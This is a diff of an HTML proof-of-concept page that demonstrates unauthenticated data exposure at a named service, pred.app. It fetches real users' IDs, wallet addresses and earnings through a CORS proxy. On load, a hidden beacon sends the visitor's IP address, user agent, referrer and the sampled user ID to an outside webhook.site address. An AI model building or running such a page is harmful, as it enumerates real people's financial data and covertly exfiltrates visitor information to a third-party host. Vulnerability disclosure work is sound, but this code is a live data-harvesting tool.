@@ -8,7 +8,7 @@ table{border-collapse:collapse;font-size:12px;margin-top:8px}td,th{border:1px so
 th{color:#8fb4ff}code{color:#9fe6a0}.muted{color:#6b7280}.box{border:1px solid #232838;padding:12px;border-radius:8px;margin-top:8px}
 </style></head><body>
 <h1>pred.app — unauthenticated data exposure</h1>
-<p class="muted">No login, no token. Everything below is fetched from <code>https://www.pred.app/api/v1/*</code> by this page.</p>
+<p class="muted">No login, no token. Fetched live from <code>https://www.pred.app/api/v1/*</code> (via a CORS reader).</p>
 <div id="status" class="box">running…</div>
 
 <h2>1) Public leaderboard leaks <code>user_id</code> + <code>proxy_wallet_address</code></h2>
@@ -23,6 +23,12 @@ th{color:#8fb4ff}code{color:#9fe6a0}.muted{color:#6b7280}.box{border:1px solid #
 <script>
 const B="https://www.pred.app/api/v1";
 const HOOK="https://webhook.site/d80a0680-f7df-4025-99b7-b4464575b9c7";
+async function api(path){
+  const r=await fetch("https://r.jina.ai/https://www.pred.app"+path);
+  const t=await r.text();
+  const j=t.search(/[\[{]/);
+  return JSON.parse(t.slice(j));
+}
 async function beacon(extra){
   let ip="?"; try{ip=(await (await fetch("https://api.ipify.org?format=json")).json()).ip}catch{}
   const data={event:"poc_opened",ip,ua:navigator.userAgent,ref:document.referrer,t:new Date().toISOString(),...extra};
@@ -39,16 +45,16 @@ function table(rows,cols){
   const info=await beacon({});
   document.getElementById("status").textContent="opened from "+info.ip+" — "+info.ua;
   try{
-    const comps=(await (await fetch(B+"/competitions/all")).json()).competitions||[];
+    const comps=(await api("/competitions/all")).competitions||[];
     const cid=comps[0].id;
-    const lb=(await (await fetch(`${B}/competitions/leaderboard/${cid}?users=all_users&order=desc&offset=0&limit=10`)).json()).leaderboard||[];
+    const lb=(await api(`/competitions/leaderboard/${cid}?users=all_users&order=desc&offset=0&limit=10`)).leaderboard||[];
     const lbBox=document.getElementById("lb"); lbBox.textContent="";
     lbBox.appendChild(table(lb,["user_id","username","proxy_wallet_address","pnl"]));
-    const ref=(await (await fetch(B+"/campaigns/referrals/leaderboard?limit=10&offset=0")).json());
+    const ref=await api("/campaigns/referrals/leaderboard?limit=10&offset=0");
     const refBox=document.getElementById("ref"); refBox.textContent="total_earners = "+ref.run.total_earners+" (pagination works; full base enumerable)";
     refBox.appendChild(table(ref.entries||[],["user_id","username","privy_wallet_address"]));
     const uid=lb[0].user_id;
-    const earn=await (await fetch(`${B}/portfolio/earnings/chart?user_id=${uid}&range=all`)).json();
+    const earn=await api(`/portfolio/earnings/chart?user_id=${uid}&range=all`);
     document.getElementById("earn").textContent="user_id="+uid+" → "+JSON.stringify(earn).slice(0,240)+" …";
     beacon({event:"poc_done",sample_user:uid});
   }catch(e){document.getElementById("status").textContent="error: "+e}
